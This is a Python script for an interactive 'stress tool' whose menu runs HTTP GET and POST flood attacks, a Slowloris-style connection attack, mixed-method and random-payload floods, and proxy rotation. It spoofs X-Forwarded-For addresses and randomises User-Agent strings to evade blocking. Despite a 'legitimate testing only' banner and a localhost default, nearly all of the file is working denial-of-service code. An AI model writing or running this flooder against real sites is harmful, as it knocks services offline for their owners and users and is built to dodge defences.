import asyncio
import aiohttp
import random
import time
import json
import sys
import os
from datetime import datetime
from typing import Dict, List, Optional

# Try to import colorama, fallback if not installed
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    # Fallback if colorama not installed
    class Fore:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        RESET = '\033[0m'
    class Style:
        BRIGHT = '\033[1m'
        DIM = '\033[2m'
        NORMAL = '\033[22m'

class LoadTester:
    def __init__(self):
        self.url = ""
        self.concurrent_requests = 100
        self.duration = 30
        self.results = {}
        self.start_time = 0
        self.running = False
        
    def clear_screen(self):
        """Clear terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        """Display cool banner"""
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
{Fore.CYAN}║                                                          ║
{Fore.CYAN}║  {Fore.YELLOW}███████╗████████╗██████╗ ███████╗███████╗███████╗{Fore.CYAN}  ║
{Fore.CYAN}║  {Fore.YELLOW}██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝{Fore.CYAN}  ║
{Fore.CYAN}║  {Fore.YELLOW}███████╗   ██║   ██████╔╝█████╗  ███████╗███████╗{Fore.CYAN}  ║
{Fore.CYAN}║  {Fore.YELLOW}╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║{Fore.CYAN}  ║
{Fore.CYAN}║  {Fore.YELLOW}███████║   ██║   ██║  ██║███████╗███████║███████║{Fore.CYAN}  ║
{Fore.CYAN}║  {Fore.YELLOW}╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝{Fore.CYAN}  ║
{Fore.CYAN}║                                                          ║
{Fore.CYAN}║     {Fore.GREEN}Advanced Load Testing & Stress Tool v3.1{Fore.CYAN}      ║
{Fore.CYAN}║     {Fore.RED}⚠️  FOR LEGITIMATE TESTING ONLY ⚠️{Fore.CYAN}          ║
{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝
{Fore.RESET}
"""
        print(banner)
    
    def show_menu(self):
        """Display main menu"""
        self.clear_screen()
        self.print_banner()
        
        menu = f"""
{Fore.YELLOW}═══════════════════════════════════════════════════════════════
{Fore.CYAN}  📋 MAIN MENU
{Fore.YELLOW}═══════════════════════════════════════════════════════════════

{Fore.GREEN}  [1] {Fore.WHITE}HTTP GET Flood Attack
{Fore.GREEN}  [2] {Fore.WHITE}HTTP POST Flood Attack  
{Fore.GREEN}  [3] {Fore.WHITE}Slowloris Style Attack (Slow Connections)
{Fore.GREEN}  [4] {Fore.WHITE}Multi-Method Attack (GET + POST + HEAD)
{Fore.GREEN}  [5] {Fore.WHITE}Random Payload Attack (with random data)
{Fore.GREEN}  [6] {Fore.WHITE}Load Testing Mode (with detailed reports)
{Fore.GREEN}  [7] {Fore.WHITE}Stress Test with Proxy Rotation
{Fore.GREEN}  [8] {Fore.WHITE}Custom Configuration
{Fore.GREEN}  [9] {Fore.WHITE}View Results
{Fore.GREEN}  [0] {Fore.WHITE}Exit

{Fore.YELLOW}═══════════════════════════════════════════════════════════════
{Fore.CYAN}  Enter your choice: {Fore.WHITE}"""
        
        return input(menu)
    
    async def send_request(self, session, method="GET", payload=None):
        """Send HTTP request with tracking"""
        headers = {
            'User-Agent': f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(70, 120)}.0.0.0 Safari/537.36",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
        # Randomize headers for each request
        if random.random() > 0.5:
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        start_time = time.time()
        try:
            if method == "GET":
                async with session.get(self.url, headers=headers, timeout=10) as response:
                    response_time = time.time() - start_time
                    # Read response to complete the request
                    await response.text()
                    return response.status, response_time, None
            elif method == "POST":
                data = payload or {"data": f"test_{random.randint(1,10000)}"}
                async with session.post(self.url, headers=headers, json=data, timeout=10) as response:
                    response_time = time.time() - start_time
                    await response.text()
                    return response.status, response_time, None
            elif method == "HEAD":
                async with session.head(self.url, headers=headers, timeout=10) as response:
                    response_time = time.time() - start_time
                    return response.status, response_time, None
            else:
                return None, 0, "Invalid method"
        except asyncio.TimeoutError:
            return None, 5.0, "Timeout"
        except Exception as e:
            return None, 0, str(e)
    
    async def attack_http_get(self):
        """HTTP GET Flood Attack"""
        self.start_time = time.time()
        print(f"\n{Fore.GREEN}▶ Starting HTTP GET Flood Attack on {self.url}")
        print(f"{Fore.CYAN}   Concurrent: {self.concurrent_requests} | Duration: {self.duration}s\n")
        
        await self.execute_attack("GET")
    
    async def attack_http_post(self):
        """HTTP POST Flood Attack"""
        self.start_time = time.time()
        print(f"\n{Fore.GREEN}▶ Starting HTTP POST Flood Attack on {self.url}")
        print(f"{Fore.CYAN}   Concurrent: {self.concurrent_requests} | Duration: {self.duration}s\n")
        
        await self.execute_attack("POST")
    
    async def attack_slowloris(self):
        """Slowloris Style Attack - Slow connections"""
        self.start_time = time.time()
        print(f"\n{Fore.GREEN}▶ Starting Slowloris Style Attack on {self.url}")
        print(f"{Fore.CYAN}   Keeping connections open with slow headers...\n")
        
        self.results = {'success': 0, 'failed': 0, 'response_times': []}
        
        async with aiohttp.ClientSession() as session:
            tasks = []
            # Create many connections with incomplete headers
            for i in range(min(self.concurrent_requests, 200)):  # Limit to prevent system crash
                task = asyncio.create_task(self.slowloris_connection(session, i))
                tasks.append(task)
            
            # Run for duration
            await asyncio.sleep(self.duration)
            # Cancel all tasks
            for task in tasks:
                task.cancel()
            
            print(f"\n{Fore.GREEN}✅ Slowloris attack completed!")
            self.show_attack_results()
    
    async def slowloris_connection(self, session, idx):
        """Simulate slowloris attack"""
        headers = {
            'User-Agent': f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/90.0.4430.212",
            'Accept': 'text/html,application/xhtml+xml',
        }
        
        try:
            # Open connection but don't complete the request quickly
            async with session.get(self.url, headers=headers, timeout=30) as response:
                # Simulate slow reading
                await asyncio.sleep(1)
                # Read in chunks slowly
                async for chunk in response.content.iter_chunks():
                    await asyncio.sleep(0.5)
                    break
                self.results['success'] += 1
        except:
            self.results['failed'] += 1
    
    async def attack_multi_method(self):
        """Multi-method attack"""
        self.start_time = time.time()
        print(f"\n{Fore.GREEN}▶ Starting Multi-Method Attack on {self.url}")
        print(f"{Fore.CYAN}   Mixing GET, POST, HEAD requests...\n")
        
        self.results = {'success': 0, 'failed': 0, 'response_times': []}
        methods = ["GET", "POST", "HEAD", "GET", "GET", "POST"]
        
        async with aiohttp.ClientSession() as session:
            tasks = []
            request_count = 0
            
            while time.time() - self.start_time < self.duration:
                for _ in range(self.concurrent_requests):
                    method = random.choice(methods)
                    payload = {"data": f"payload_{random.randint(1,9999)}"} if method == "POST" else None
                    task = asyncio.create_task(self.send_request(session, method, payload))
                    tasks.append(task)
                    request_count += 1
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, Exception):
                        self.results['failed'] += 1
                    elif result and result[0]:
                        self.results['success'] += 1
                        self.results['response_times'].append(result[1])
                    else:
                        self.results['failed'] += 1
                
                tasks = []
                
                elapsed = int(time.time() - self.start_time)
                print(f"⏳ Progress: {elapsed}/{self.duration}s | Success: {self.results['success']} | Failed: {self.results['failed']}", end='\r')
        
        self.show_attack_results()
    
    async def attack_random_payload(self):
        """Random payload attack"""
        self.start_time = time.time()
        print(f"\n{Fore.GREEN}▶ Starting Random Payload Attack on {self.url}")
        print(f"{Fore.CYAN}   Sending random data payloads...\n")
        
        self.results = {'success': 0, 'failed': 0, 'response_times': []}
        
        async with aiohttp.ClientSession() as session:
            tasks = []
            request_count = 0
            
            while time.time() - self.start_time < self.duration:
                for _ in range(self.concurrent_requests):
                    # Generate random payload
                    payload = {
                        "id": random.randint(1, 99999),
                        "data": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 100))),
                        "timestamp": time.time(),
                        "random": random.random()
                    }
                    task = asyncio.create_task(self.send_request(session, "POST", payload))
                    tasks.append(task)
                    request_count += 1
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, Exception):
                        self.results['failed'] += 1
                    elif result and result[0]:
                        self.results['success'] += 1
                        self.results['response_times'].append(result[1])
                    else:
                        self.results['failed'] += 1
                
                tasks = []
                
                elapsed = int(time.time() - self.start_time)
                print(f"⏳ Progress: {elapsed}/{self.duration}s | Success: {self.results['success']} | Failed: {self.results['failed']}", end='\r')
        
        self.show_attack_results()
    
    async def attack_with_proxies(self):
        """Attack with proxy rotation"""
        self.start_time = time.time()
        # Sample proxy list - you would add your own
        proxies = [
            "http://proxy1:8080",
            "http://proxy2:8080",
            "http://proxy3:8080",
        ]
        
        print(f"\n{Fore.GREEN}▶ Starting Attack with Proxy Rotation")
        print(f"{Fore.CYAN}   Using {len(proxies)} proxies...\n")
        print(f"{Fore.YELLOW}   ⚠️  No proxies configured. Running without proxy.\n")
        
        self.results = {'success': 0, 'failed': 0, 'response_times': []}
        
        async with aiohttp.ClientSession() as session:
            tasks = []
            request_count = 0
            
            while time.time() - self.start_time < self.duration:
                for _ in range(self.concurrent_requests):
                    proxy = random.choice(proxies) if proxies else None
                    task = asyncio.create_task(
                        self.send_request_with_proxy(session, proxy)
                    )
                    tasks.append(task)
                    request_count += 1
                
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks = []
                
                elapsed = int(time.time() - self.start_time)
                print(f"⏳ Progress: {elapsed}/{self.duration}s | Success: {self.results.get('success', 0)} | Failed: {self.results.get('failed', 0)}", end='\r')
        
        self.show_attack_results()
    
    async def send_request_with_proxy(self, session, proxy):
        """Send request through proxy"""
        headers = {
            'User-Agent': f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(70, 120)}.0.0.0",
        }
        
        try:
            if proxy:
                async with session.get(self.url, headers=headers, proxy=proxy, timeout=10) as response:
                    await response.text()
                    self.results['success'] = self.results.get('success', 0) + 1
            else:
                async with session.get(self.url, headers=headers, timeout=10) as response:
                    await response.text()
                    self.results['success'] = self.results.get('success', 0) + 1
        except:
            self.results['failed'] = self.results.get('failed', 0) + 1
    
    async def execute_attack(self, method="GET"):
        """Generic attack executor"""
        self.results = {'success': 0, 'failed': 0, 'response_times': []}
        
        async with aiohttp.ClientSession() as session:
            tasks = []
            request_count = 0
            
            while time.time() - self.start_time < self.duration:
                for _ in range(self.concurrent_requests):
                    task = asyncio.create_task(self.send_request(session, method))
                    tasks.append(task)
                    request_count += 1
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Process results
                for result in results:
                    if isinstance(result, Exception):
                        self.results['failed'] += 1
                    elif result and result[0]:
                        self.results['success'] += 1
                        self.results['response_times'].append(result[1])
                    else:
                        self.results['failed'] += 1
                
                tasks = []
                
                elapsed = int(time.time() - self.start_time)
                print(f"⏳ Progress: {elapsed}/{self.duration}s | "
                      f"Success: {self.results['success']} | "
                      f"Failed: {self.results['failed']}", end='\r')
        
        self.show_attack_results()
    
    def show_attack_results(self):
        """Display attack results"""
        total = self.results.get('success', 0) + self.results.get('failed', 0)
        
        if total == 0:
            print(f"\n\n{Fore.YELLOW}⚠️  No requests completed.")
            return
        
        print(f"\n\n{Fore.YELLOW}═══════════════════════════════════════════════════════════════")
        print(f"{Fore.CYAN}  📊 ATTACK RESULTS")
        print(f"{Fore.YELLOW}═══════════════════════════════════════════════════════════════")
        print(f"{Fore.GREEN}✅ Successful Requests: {self.results.get('success', 0)}")
        print(f"{Fore.RED}❌ Failed Requests: {self.results.get('failed', 0)}")
        print(f"{Fore.WHITE}📊 Total Requests: {total}")
        print(f"{Fore.WHITE}📊 Success Rate: {(self.results.get('success', 0)/total*100 if total > 0 else 0):.2f}%")
        
        response_times = self.results.get('response_times', [])
        if response_times:
            print(f"\n{Fore.CYAN}⚡ Response Times:")
            print(f"{Fore.WHITE}   Average: {sum(response_times)/len(response_times):.3f}s")
            print(f"{Fore.WHITE}   Min: {min(response_times):.3f}s")
            print(f"{Fore.WHITE}   Max: {max(response_times):.3f}s")
            
            sorted_times = sorted(response_times)
            p95 = sorted_times[int(len(sorted_times) * 0.95)] if len(sorted_times) > 0 else 0
            print(f"{Fore.WHITE}   95th Percentile: {p95:.3f}s")
        else:
            print(f"\n{Fore.YELLOW}⚠️  No response time data available.")
        
        print(f"{Fore.YELLOW}═══════════════════════════════════════════════════════════════\n")
        input(f"{Fore.CYAN}Press Enter to continue...{Fore.WHITE}")
    
    async def load_test_mode(self):
        """Comprehensive load testing with detailed report"""
        print(f"\n{Fore.GREEN}▶ Starting Comprehensive Load Test")
        print(f"{Fore.CYAN}   This will test multiple aspects of the server...\n")
        
        # Test different concurrency levels
        concurrency_levels = [10, 50, 100, 200]
        
        all_results = []
        for level in concurrency_levels:
            print(f"\n{Fore.YELLOW}Testing with {level} concurrent requests...")
            self.concurrent_requests = level
            self.duration = 15
            self.start_time = time.time()
            await self.execute_attack("GET")
            
            # Store results
            result_copy = self.results.copy()
            result_copy['concurrency'] = level
            all_results.append(result_copy)
            
            # Wait a bit between tests
            await asyncio.sleep(2)
        
        # Save all results
        filename = f"load_test_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        data = {
            "timestamp": datetime.now().isoformat(),
            "url": self.url,
            "tests": all_results
        }
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"\n{Fore.GREEN}📁 Full results saved to: {filename}")
    
    def custom_configuration(self):
        """Custom configuration menu"""
        self.clear_screen()
        print(f"\n{Fore.YELLOW}═══════════════════════════════════════════════════════════════")
        print(f"{Fore.CYAN}  ⚙️  CUSTOM CONFIGURATION")
        print(f"{Fore.YELLOW}═══════════════════════════════════════════════════════════════")
        
        print(f"\n{Fore.WHITE}Current Configuration:")
        print(f"  {Fore.CYAN}URL: {Fore.WHITE}{self.url or 'Not Set'}")
        print(f"  {Fore.CYAN}Concurrent Requests: {Fore.WHITE}{self.concurrent_requests}")
        print(f"  {Fore.CYAN}Duration (seconds): {Fore.WHITE}{self.duration}")
        
        print(f"\n{Fore.GREEN}Enter new values (press Enter to keep current):")
        
        url_input = input(f"{Fore.CYAN}Target URL: {Fore.WHITE}")
        if url_input:
            self.url = url_input
        
        conc_input = input(f"{Fore.CYAN}Concurrent Requests [{self.concurrent_requests}]: {Fore.WHITE}")
        if conc_input and conc_input.isdigit():
            self.concurrent_requests = int(conc_input)
        
        dur_input = input(f"{Fore.CYAN}Duration (seconds) [{self.duration}]: {Fore.WHITE}")
        if dur_input and dur_input.isdigit():
            self.duration = int(dur_input)
        
        print(f"\n{Fore.GREEN}✅ Configuration updated!")
        input(f"\n{Fore.CYAN}Press Enter to continue...{Fore.WHITE}")
    
    async def run(self):
        """Main application loop"""
        while True:
            choice = self.show_menu()
            
            # Set default URL if not set
            if not self.url:
                self.url = "http://localhost:8080"
                print(f"\n{Fore.YELLOW}⚠️  No target URL set. Using default: {self.url}")
                print(f"{Fore.YELLOW}   Please configure in Custom Configuration (Option 8)")
                input(f"\n{Fore.CYAN}Press Enter to continue...{Fore.WHITE}")
                continue
            
            try:
                if choice == "1":
                    await self.attack_http_get()
                elif choice == "2":
                    await self.attack_http_post()
                elif choice == "3":
                    await self.attack_slowloris()
                elif choice == "4":
                    await self.attack_multi_method()
                elif choice == "5":
                    await self.attack_random_payload()
                elif choice == "6":
                    await self.load_test_mode()
                elif choice == "7":
                    await self.attack_with_proxies()
                elif choice == "8":
                    self.custom_configuration()
                elif choice == "9":
                    if self.results and self.results.get('success', 0) + self.results.get('failed', 0) > 0:
                        self.show_attack_results()
                    else:
                        print(f"\n{Fore.YELLOW}⚠️  No results to display. Run an attack first.")
                        input(f"\n{Fore.CYAN}Press Enter to continue...{Fore.WHITE}")
                elif choice == "0":
                    print(f"\n{Fore.GREEN}👋 Goodbye!")
                    sys.exit()
                else:
                    print(f"\n{Fore.RED}❌ Invalid choice. Please try again.")
                    input(f"\n{Fore.CYAN}Press Enter to continue...{Fore.WHITE}")
            except Exception as e:
                print(f"\n{Fore.RED}❌ Error: {str(e)}")
                print(f"{Fore.YELLOW}   Check your target URL and try again.")
                input(f"\n{Fore.CYAN}Press Enter to continue...{Fore.WHITE}")

# Main entry point
async def main():
    tester = LoadTester()
    await tester.run()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}⏹️  Program terminated by user.")
        sys.exit()
    except Exception as e:
        print(f"\n{Fore.RED}❌ Fatal Error: {str(e)}")
        sys.exit()